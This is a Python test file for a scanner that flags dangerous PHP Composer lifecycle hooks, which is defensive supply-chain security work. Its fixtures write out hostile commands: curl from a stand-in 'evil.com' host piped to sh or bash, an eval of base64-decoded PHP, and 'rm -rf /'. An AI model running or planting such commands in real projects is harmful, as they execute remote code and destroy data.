"""Tests for ComposerScriptScanner — PHP Composer lifecycle hooks."""

from __future__ import annotations

import asyncio
import json

import pytest

from depfence.scanners.composer_script_scanner import ComposerScriptScanner


@pytest.fixture
def scanner():
    return ComposerScriptScanner()


def run(scanner, project_dir):
    return asyncio.run(scanner.scan_project(project_dir))


def write_composer(tmp_path, data):
    (tmp_path / "composer.json").write_text(json.dumps(data))


class TestDangerousCommands:
    def test_curl_pipe_sh(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "evil/pkg",
            "scripts": {"post-install-cmd": "curl http://evil.com/payload | sh"}
        })
        findings = run(scanner, tmp_path)
        cm03 = [f for f in findings if f.metadata.get("rule") == "CM-03"]
        assert len(cm03) == 1
        assert cm03[0].severity.name == "CRITICAL"

    def test_eval_in_hook(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "evil/pkg",
            "scripts": {"post-update-cmd": "php -r 'eval(base64_decode(\"...\"))'"}
        })
        findings = run(scanner, tmp_path)
        cm03 = [f for f in findings if f.metadata.get("rule") == "CM-03"]
        assert len(cm03) == 1


class TestPhpClassHook:
    def test_class_hook(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "pkg/name",
            "scripts": {"post-install-cmd": "App\\Installer::postInstall"}
        })
        findings = run(scanner, tmp_path)
        cm02 = [f for f in findings if f.metadata.get("rule") == "CM-02"]
        assert len(cm02) == 1
        assert cm02[0].severity.name == "MEDIUM"


class TestShellCommand:
    def test_shell_command(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "pkg/name",
            "scripts": {"post-install-cmd": "rm -rf vendor/cache"}
        })
        findings = run(scanner, tmp_path)
        cm01 = [f for f in findings if f.metadata.get("rule") == "CM-01"]
        assert len(cm01) == 1

    def test_php_command(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "pkg/name",
            "scripts": {"post-install-cmd": "php artisan migrate"}
        })
        findings = run(scanner, tmp_path)
        cm01 = [f for f in findings if f.metadata.get("rule") == "CM-01"]
        assert len(cm01) == 1


class TestCustomInstaller:
    def test_custom_installer_class(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "evil/installer",
            "extra": {"class": "Evil\\CustomInstaller"}
        })
        findings = run(scanner, tmp_path)
        cm04 = [f for f in findings if f.metadata.get("rule") == "CM-04"]
        assert len(cm04) == 1


class TestArrayScripts:
    def test_array_of_commands(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "pkg/multi",
            "scripts": {"post-install-cmd": [
                "php artisan clear-compiled",
                "curl http://evil.com | bash"
            ]}
        })
        findings = run(scanner, tmp_path)
        cm01 = [f for f in findings if f.metadata.get("rule") == "CM-01"]
        cm03 = [f for f in findings if f.metadata.get("rule") == "CM-03"]
        assert len(cm01) == 1
        assert len(cm03) == 1


class TestNoFindings:
    def test_clean_composer(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "safe/pkg",
            "require": {"php": ">=8.0"}
        })
        findings = run(scanner, tmp_path)
        assert len(findings) == 0

    def test_non_lifecycle_script(self, tmp_path, scanner):
        write_composer(tmp_path, {
            "name": "safe/pkg",
            "scripts": {"custom-script": "rm -rf /"}
        })
        findings = run(scanner, tmp_path)
        assert len(findings) == 0
